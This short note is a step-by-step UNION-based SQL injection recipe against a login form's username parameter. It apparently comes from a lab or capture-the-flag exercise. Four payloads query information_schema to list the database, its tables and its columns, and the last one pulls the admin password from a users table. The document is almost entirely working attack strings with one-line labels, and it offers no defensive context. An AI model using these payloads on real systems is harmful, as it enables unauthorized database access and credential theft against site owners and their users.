union attack with random column+table names

```
?username=asdf' union select table_schema FROM information_Schema.tables-- -&password=a
shows db name

?username=asdf' union select concat(table_schema,table_name) from information_schema.tables where table_schema='user_db'-- -&password=a
shows name of table

?username=asdf' union select concat(column_name,table_name) from information_schema.columns where table_name='table_randomstring'-- -&password=a
shows columns

?username=asdf' union select password_randomstring from users_randomstring where username_randomstring='admin'-- -&password=a
gets password
```